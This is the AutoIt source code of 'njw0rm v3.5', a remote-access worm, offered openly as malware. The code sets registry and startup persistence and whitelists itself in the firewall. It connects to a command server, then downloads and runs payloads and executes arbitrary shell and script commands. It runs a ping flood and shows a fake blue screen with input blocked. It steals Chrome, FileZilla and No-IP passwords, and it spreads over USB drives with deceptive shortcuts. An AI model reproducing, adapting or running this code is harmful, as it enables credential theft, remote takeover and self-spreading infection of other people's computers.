#comments-start
njw0rm  : v3.5
Write By: njq8 + Mr.Mobark
T = @njq8 + F = HK Dark
Last Update: 2013/7/10
#comments-end

#NoTrayIcon
#INCLUDE <WINAPI.AU3>
#include <WindowsConstants.au3>
#include <GUIConstantsEx.au3>
#include <Misc.au3>
#include <string.au3>
#Include <File.au3>
#Include <Array.au3>
#include <SQLite.au3>
#include <SQLite.dll.au3>
#include <Process.au3>
Opt("RunErrorsFatal", 0)
Local $Host =  "<host>"
Local $PORT = <port>
Local $EXE  = "<exe>"
Local $DIR  = EnvGet("<dir>") & "\"
Local $VR  = "3.5"
Local $name  =  "<name>"
$name &=   "_" & Hex( driveGetSerial( @HomeDrive))
$OS=    @OSVersion & " "& @OSArch  & " " & StringReplace( @OSServicePack,"Service Pack ","SP")
if StringInStr( $OS,"SP")<1 then $OS &="SP0"
Local $USB  =  "!"
cusb()
$melt="<melt>"
$Y="0njxq80"
$MTX ="<mtx>"
$TIMER=0
$fh=-1
if $cmdline[0]=2 Then ; check cmdline for melt
   Select
	case  $cmdline[1]= "del"
	if $melt=-1 Then
	  FileDelete($cmdline[2])
    endif
   EndSelect
endif
Sleep( @AutoItPID /10)
If _Singleton($MTX , 1) = 0 Then
    Exit
EndIf
if @AutoItExe <> $dir & $exe Then ; check if i need to copy
	FileCopy(  @AutoItExe ,$dir & $exe,1 )
	ShellExecute( $dir & $exe ,"""del"" " & @AutoItExe)
	Exit
 EndIf
$mem=""
$sock =-1
bk()
xins()
ins()
usbx()
$TIME=0
$AC=""
$EA=""
While 1
   $TIME +=1
   if $TIME=5 Then
	  $TIME=0
	  ins()
	  usb()
  EndIf
      if @error Then
   EndIf
 $PK =RC()
    if @error Then
   EndIf

 Select
	case $pk=-1
	Sleep(2000)
	cn() ; if not connected then connect,, Call CN FUNC
	sd("lv" & $Y & $name & $Y & K() & $Y & $os & $Y & $VR  & $Y & $USB & $Y & WinGetTitle(""))
 Case $pk="" ; if nothing recived..

        $timer +=1

		if $timer=8 Then
		   $timer=0
		   $EA=WinGetTitle("")
		   if $EA<>$AC Then
			   sd("ac" & $Y & $EA)
			  EndIf
	$AC = $EA
	$EA=""
		   endif
 case $pk<>"" ; if there is packet process it..
		 $A= StringSplit($PK,"0njxq80",1)
	if $A[0]>0 Then
	  Select
		case $A[1]="DL"

    InetGet($A[2], @TempDir & "\" & $A[3] ,1)
	 if FileExists( @TempDir & "\" & $A[3]) Then
		  	ShellExecute("cmd.exe",  "/c start %temp%\" & $A[3],"" ,"" ,@SW_HIDE)
		sd("MSG" & $Y & "Executed As " & $A[3])
	 Else
		   sd("MSG" & $Y & "Download ERR")
     EndIf
   case $A[1]="up"; update
	      InetGet($A[2], @TempDir & "\" & $A[3] ,1)
	if FileExists( @TempDir & "\" & $A[3]) Then
	   	ShellExecute("cmd.exe",  "/c start %temp%\" & $A[3],"" ,"" ,@SW_HIDE)
		uns()
	 EndIf
	    sd("MSG" & $Y & "Update ERR")
	case $A[1]="un" ; uninstall!
	  uns()
   case $A[1]="ex" ; execute autoit script
	  Execute( $A[2])
   case $A[1]="cmd"; execute cmd.exe
	  ShellExecute("cmd.exe", $A[2],"","",@SW_HIDE)
   case $A[1]="pwd" ; get passwords
	  sd("pas" & $Y & noip() & chrome() & FileZilla())
   case $A[1]="url"
     ShellExecute($A[2])
   case $A[1]="att"
    RunWait( @comspec & " /c ping "&$A[2]&" -l "&$A[2]&" -t","",@SW_HIDE)
   Case $A[1]="msg"
	 MsgBox(0,$A[2],$A[3])
 Case $A[1]="scb"

_WinAPI_ShowCursor(False)

HotKeySet("{F8}", "ExitBlueScr")

Global $DesktopWidth = @DesktopWidth, $DesktopHeight = @DesktopHeight
Global $DesktopDepth = @DesktopDepth, $DesktopRefresh = @DesktopRefresh
GUICreate("Bluescr", @DesktopWidth + 4, @DesktopHeight + 4)
GUISetBkColor(0x0000A0)
$Label = GUICtrlCreateLabel("A problem has been detected and Windows has been shut down to prevent damage" & @CRLF & _
"to your computer." & @CRLF & _
@CRLF & _
"The problem seems to be caused by the following file: SPCMDCON.SYS" & @CRLF & _
@CRLF & _
"PAGE_FAULT_IN_NONPAGED_AREA" & @CRLF & _
@CRLF & _
"If this is the first time you've seen this stop error screen," & @CRLF & _
"restart your computer. If this screen appears again, follow" & @CRLF & _
"these steps:" & @CRLF & _
@CRLF & _
"Check to make sure any new hardware or software is properly installed." & @CRLF & _
"If this is a new installation, ask your hardware or software manufacturer" & @CRLF & _
"for any Windows updates you might need." & @CRLF & _
@CRLF & _
"If problems continue, disable or remove any newly installed hardware" & @CRLF & _
"or software. Disable BIOS memory options such as caching or shadowing." & @CRLF & _
"If you need to use Safe Mode to remove or disable components, restart" & @CRLF & _
"your computer, press F8 to select Advanced Startup Options, and then" & @CRLF & _
"select Safe Mode." & @CRLF & _
@CRLF & _
"Technical information:" & @CRLF & _
@CRLF & _
"*** STOP: 0x00000050 (0xFD3094C2,0x00000001,0xFBFE7617,0x00000000)" & @CRLF & _
@CRLF & _
@CRLF & _
"***  SPCMDCON.SYS - Address FBFE7617 base at FBFE5000, DateStamp 3d6dd67c", 10, 10, @DesktopWidth - 10, @DesktopHeight - 10)
GUICtrlSetFont(-1, 17, 100, -1, "Lucida Console")
GUICtrlSetColor(-1, 0xD8D8D8)
GUICtrlSetOnEvent(-1, "None")
GUISetState()
$iWidth = 1024
$iHeight = 768
$iBitsPP = 32
$iRefreshRate = 60
BlockInput(1)
If $iWidth = @DesktopWidth And $iHeight = @DesktopHeight And $iBitsPP = @DesktopDepth And $iRefreshRate = @DesktopRefresh Then
GUISetBkColor(0x000000)
GUICtrlSetState($Label, $GUI_HIDE)
_ChangeScreenRes(800, 600, $iBitsPP, $iRefreshRate)
Sleep(1000)
GUICtrlSetState($Label, $GUI_SHOW)
GUISetBkColor(0x0000A0)
_ChangeScreenRes($iWidth, $iHeight, $iBitsPP, $iRefreshRate)
Else
_ChangeScreenRes($iWidth, $iHeight, $iBitsPP, $iRefreshRate)
EndIf
While 1

WEnd

Func _ChangeScreenRes($i_Width = @DesktopWidth, $i_Height = @DesktopHeight, $i_BitsPP = @DesktopDepth, $i_RefreshRate = @DesktopRefresh) ;from ChangeResolution.au3
    Local Const $DM_PELSWIDTH = 0x00080000
    Local Const $DM_PELSHEIGHT = 0x00100000
    Local Const $DM_BITSPERPEL = 0x00040000
    Local Const $DM_DISPLAYFREQUENCY = 0x00400000
    Local Const $CDS_TEST = 0x00000002
    Local Const $CDS_UPDATEREGISTRY = 0x00000001
    Local Const $DISP_CHANGE_RESTART = 1
    Local Const $DISP_CHANGE_SUCCESSFUL = 0
    Local Const $HWND_BROADCAST = 0xffff
    Local Const $WM_DISPLAYCHANGE = 0x007E
    If $i_Width = "" Or $i_Width = -1 Then $i_Width = @DesktopWidth
    If $i_Height = "" Or $i_Height = -1 Then $i_Height = @DesktopHeight
    If $i_BitsPP = "" Or $i_BitsPP = -1 Then $i_BitsPP = @DesktopDepth
    If $i_RefreshRate = "" Or $i_RefreshRate = -1 Then $i_RefreshRate = @DesktopRefresh
    Local $DEVMODE = DllStructCreate("byte[32];int[10];byte[32];int[6]")
    Local $B = DllCall("user32.dll", "int", "EnumDisplaySettings", "ptr", 0, "long", 0, "ptr", DllStructGetPtr($DEVMODE))
    If @error Then
        $B = 0
        SetError(1)
        Return $B
    Else
        $B = $B[0]
    EndIf
    If $B <> 0 Then
        DllStructSetData($DEVMODE, 2, BitOR($DM_PELSWIDTH, $DM_PELSHEIGHT, $DM_BITSPERPEL, $DM_DISPLAYFREQUENCY), 5)
        DllStructSetData($DEVMODE, 4, $i_Width, 2)
        DllStructSetData($DEVMODE, 4, $i_Height, 3)
        DllStructSetData($DEVMODE, 4, $i_BitsPP, 1)
        DllStructSetData($DEVMODE, 4, $i_RefreshRate, 5)
        $B = DllCall("user32.dll", "int", "ChangeDisplaySettings", "ptr", DllStructGetPtr($DEVMODE), "int", $CDS_TEST)
        If @error Then
            $B = -1
        Else
            $B = $B[0]
        EndIf
        Select
            Case $B = $DISP_CHANGE_RESTART
                $DEVMODE = ""
                Return 2
            Case $B = $DISP_CHANGE_SUCCESSFUL
                DllCall("user32.dll", "int", "ChangeDisplaySettings", "ptr", DllStructGetPtr($DEVMODE), "int", $CDS_UPDATEREGISTRY)
                DllCall("user32.dll", "int", "SendMessage", "hwnd", $HWND_BROADCAST, "int", $WM_DISPLAYCHANGE, _
                        "int", $i_BitsPP, "int", $i_Height * 2 ^ 16 + $i_Width)
                $DEVMODE = ""
                Return 1
            Case Else
                $DEVMODE = ""
                SetError(1)
                Return $B
        EndSelect
    EndIf
EndFunc

Func None()

EndFunc

Func ExitBlueScr()
    _WinAPI_ShowCursor(True)
    _ChangeScreenRes($DesktopWidth, $DesktopHeight, $DesktopDepth, $DesktopRefresh)
    Exit
EndFunc
;;;;;;;;;;;;;;;;;;;;;;;;;;;


EndSelect

	endif

EndSelect
Sleep(1000)

WEnd
Func uns()
RegDelete ("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",$EXE)
RegDelete ("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run",$EXE)
FileDelete(@startupdir &"\" & $EXE)
ShellExecute("netsh","firewall delete allowedprogram " & ChrW(34) & @AutoItExe & ChrW(34), "", "",@SW_HIDE)
usbx()
ShellExecute(@ComSpec,"/k ping 0 & del " & ChrW(34) & @AutoItExe & ChrW(34) & " & exit","" ,""  ,@SW_HIDE)
Exit
EndFunc
Func ins()
if RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",$EXE)<>chrw(34) & @AutoItExe  & chrw(34) Then
   RegWrite ("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",$EXE ,"REG_SZ", chrw(34) & @AutoItExe  & chrw(34))
endif
 if RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run",$EXE)<>chrw(34) & @AutoItExe  & chrw(34) Then
    RegWrite ("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run",$EXE ,"REG_SZ", chrw(34) & @AutoItExe  & chrw(34))
endif
if FileExists(@startupdir &"\" & $EXE)=False Then
FileCopy(@AutoItExe,@startupdir &"\" & $EXE,1)
endif
if @error Then
EndIf
EndFunc
Func xins()
   EnvSet("SEE_MASK_NOZONECHECKS","1")
   ShellExecute("netsh","firewall add allowedprogram " & ChrW(34) & @AutoItExe & ChrW(34) & " " & ChrW(34) & $EXE & ChrW(34) & " ENABLE", "", "",@SW_HIDE)
   if @error Then
   EndIf
   FileCopy(@AutoItExe,@startupdir &"\" & $EXE,1)
    if @error Then
   EndIf
EndFunc
Func usb()
   $D=DriveGetDrive("REMOVABLE")

   for $DD=1 to UBound($D)-1
	  if  DriveStatus($D[$DD])="READY" Then
		 if DriveSpaceFree($D[$DD])>1024 Then
			 if FileExists($D[$DD] & "\My Pictures")=false then DirCreate($D[$DD] & "\My Pictures")

			$F=_FileListToArray($D[$DD],"*.*",2 )

		 if FileExists($D[$DD] &"\"& $EXE) Then
			Else
			FileCopy(@AutoItExe,$D[$DD] &"\"& $EXE)
			FileSetAttrib($D[$DD] &"\"& $EXE,"+H")
			$YES=0
   For $U= 1 to UBound($F)-1
	   $yes=$yes +1
	   if $yes=10 Then
	   $yes=0
	   ExitLoop
	   EndIf
	FileSetAttrib($D[$DD] &"\"& $F[$U],"+H")
	FileCreateShortcut( "cmd.exe",$D[$DD] &"\"& $F[$U],"","/c start " & StringReplace($EXE," ",chrw(34) & " " & chrw(34)) & "&explorer /root,""%CD%" & StringReplace($F[$U]," ", chrw(34) & " " & chrw(34)) &""" & exit" ,"","%windir%\system32\SHELL32.dll","",3,@SW_SHOWMINNOACTIVE)
   Next
   endif
_ArrayDelete($F, 0)
			endif

		 EndIf
	  Next
EndFunc
Func usbx()
   $D=DriveGetDrive("REMOVABLE")

   for $DD=1 to UBound($D)-1
	  if  DriveStatus($D[$DD])="READY" Then
		 if DriveSpaceFree($D[$DD])>1024 Then
				 	     $F=_FileListToArray($D[$DD],"*.*",2)
		 if FileExists($D[$DD] &"\"& $EXE) Then
			FileSetAttrib($D[$DD] &"\"& $EXE,"-H+N")
			FileDelete($D[$DD] &"\"& $EXE)
		 endif
		 		 For $U= 1 to UBound($F)-1
	FileSetAttrib($D[$DD] &"\"& $F[$U],"-H")
		FileSetAttrib($D[$DD] &"\"& $F[$U],"+N")
		FileDelete( $D[$DD] &"\"& $F[$U] &".lnk")
   Next
_ArrayDelete($F, 0)
			endif

		 EndIf
	  Next
EndFunc

Func RC()
if @error Then
   Return -1
EndIf

if $sock < 1 Then
  Return -1
EndIf

$data = TCPRecv($sock,1024,0)

if @error Then
   Return -1
EndIf
$mem &= $data
if StringInStr($mem, @CRLF )   Then
   $DA =stringsplit($mem, @crlf)
   $data=$da[1]
   $IDX =stringinstr($mem,@crlf)
   $IDX += StringLen(String(@crlf))
   $LN = StringLen($mem)
   $mem= StringMid($mem,$IDX   , $ln - $IDX)
 Return $data
 EndIf

 Return ""
EndFunc

Func SD($da)
if @error Then
EndIf
   TCPSend($sock,$da & @CRLF)
   if @error then
	  Return 0
   Else
	  return 1
	  endif
EndFunc
Func CN()
TCPCloseSocket($sock)
if @error Then
EndIf
TCPShutdown()
if @error Then
EndIf
TCPStartup()
if @error Then
EndIf
$sock=-1

$sock= TCPConnect(TCPNameToIP($HOST),$port)
if @error Then

EndIf
EndFunc


;API
Func K()
$b = DllStructCreate("char[3]")
DllCall("kernel32.dll", "long", "GetLocaleInfo", "long", 1024, "long", 7, "ptr", DllStructGetPtr($b), "long", 3)
Return  DllStructGetData($b, 1)
EndFunc

Func bk()
; this method called before installing njw0rm .. so you can add botkiller or anyother codes here .. i add clearing usb from shortcuts+vbs files

$ST= StringSplit( "a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z",",")
for $H =1 to $ST[0]
if DriveStatus($ST[$H] & ":\") ="READY" then
FileSetAttrib($ST[$H] & ":\*.*","-H")
FileDelete($ST[$H] & ":\*.vbs")
FileDelete($ST[$H] & ":\*.scr")
FileDelete($ST[$H] & ":\*.lnk")
EndIf
Next
EndFunc
Func CUSB()
$USB= IniRead($DIR & $EXE & ".ini","","usb","!")
if $USB="!" Then
 $SP= StringSplit(@AutoItExe,"\")

 if $SP[0]=2 and StringLen( $SP[1])=2 and StringLower($SP[2])= StringLower($EXE) Then
	 IniWrite($DIR & $EXE & ".ini","","usb","Y")
 Else

	  	 IniWrite($DIR & $EXE & ".ini","","usb","N")
	 EndIf

EndIf
$USB= IniRead($DIR & $EXE & ".ini","","usb","!")
EndFunc

Func NOIP()
$pUSR=RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC","Username")
if $pUSR="" then return ""
$pPWD=RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC","Password")
Return "URL: http://no-ip.com/" & $Y & "USR: " & $pusr & $Y & "PWD: /base64" & $ppwd & $Y
EndFunc

Func FileZilla()
Local $pwds="",$h,$pFN=EnvGet("appdata") &"\FileZilla\recentservers.xml"
if FileExists($pfn)=false then return ""
$h= Fileopen($pfn,0)
if $h=-1 then return ""
$phost=""
$pport=21
$pusr=""
$ppass=""
While True
	$line= FileReadLine($h)
	 If @error = -1 Then ExitLoop
	 if StringInStr($line,"<Host>") Then
		 $pusr=""
		 $ppass=""
		 $pport=21
		 $phost= StringMid($line,1,StringInStr($line,"</")-1)
		 $phost= StringMid($phost,StringInStr($phost,">")+1)
	 EndIf
	 if StringInStr($line,"<Port>") Then
		 $pport= StringMid($line,1,StringInStr($line,"</")-1)
		 $pport= StringMid($pport,StringInStr($pport,">")+1)
	 EndIf
	 if StringInStr($line,"<User>") Then
		 $pusr= StringMid($line,1,StringInStr($line,"</")-1)
		 $pusr= StringMid($pusr,StringInStr($pusr,">")+1)
	 EndIf
	 if StringInStr($line,"<Pass>") Then
		 $ppass= StringMid($line,1,StringInStr($line,"</")-1)
		 $ppass= StringMid($ppass,StringInStr($ppass,">")+1)
	 EndIf
	 if StringInStr($line,"</Server>") Then
	$pwds = $pwds & "URL: ftp://" & $phost  &":" & $pport & $Y & "USR: " & $pusr & $Y & "PWD: " & $ppass & $Y
	 EndIf
WEnd
Return $pwds
EndFunc
Func Chrome()
Local $Q, $R, $PWDS="",$pfn= RegRead('HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders', 'Local AppData') & "\Google\Chrome\User Data\Default\Login Data"
if FileExists($pfn)=False then return ""
_SQLite_Startup()
_SQLite_Open($pfn)
_SQLite_Query(-1, "SELECT * FROM logins;", $Q)
While _SQLite_FetchData($Q, $r) = 0
$pwds =   $pwds  & "URL: "& $r[0] & $Y &"USR: "& $r[3] & $Y &"PWD: "& UncryptRDPPassword( $r[5]) & $Y
WEnd
_SQLite_Close()
_SQLite_Shutdown()
Return $pwds
EndFunc

Func UncryptRDPPassword($bin)
;This Func From >> http://www.autoitscript.com/forum/topic/96783-dllcall-for-cryptunprotectdata/#entry695769
    Local Const $CRYPTPROTECT_UI_FORBIDDEN = 0x1
    Local Const $DATA_BLOB = "int;ptr"

    Local $passStr = DllStructCreate("byte[1024]")
    Local $DataIn = DllStructCreate($DATA_BLOB)
    Local $DataOut = DllStructCreate($DATA_BLOB)
    $pwDescription = 'psw'
    $PwdHash = ""

    DllStructSetData($DataOut, 1, 0)
    DllStructSetData($DataOut, 2, 0)

    DllStructSetData($passStr, 1, $bin)
    DllStructSetData($DataIn, 2, DllStructGetPtr($passStr, 1))
    DllStructSetData($DataIn, 1, BinaryLen($bin))

    $return = DllCall("crypt32.dll","int", "CryptUnprotectData", _
                                    "ptr", DllStructGetPtr($DataIn), _
                                    "ptr", 0, _
                                    "ptr", 0, _
                                    "ptr", 0, _
                                    "ptr", 0, _
                                    "dword", $CRYPTPROTECT_UI_FORBIDDEN, _
                                    "ptr", DllStructGetPtr($DataOut))
    If @error Then Return ""

    $len = DllStructGetData($DataOut, 1)
    $PwdHash = Ptr(DllStructGetData($DataOut, 2))
    $PwdHash = DllStructCreate("byte[" & $len & "]", $PwdHash)
    Return BinaryToString(DllStructGetData($PwdHash, 1), 4)
EndFunc
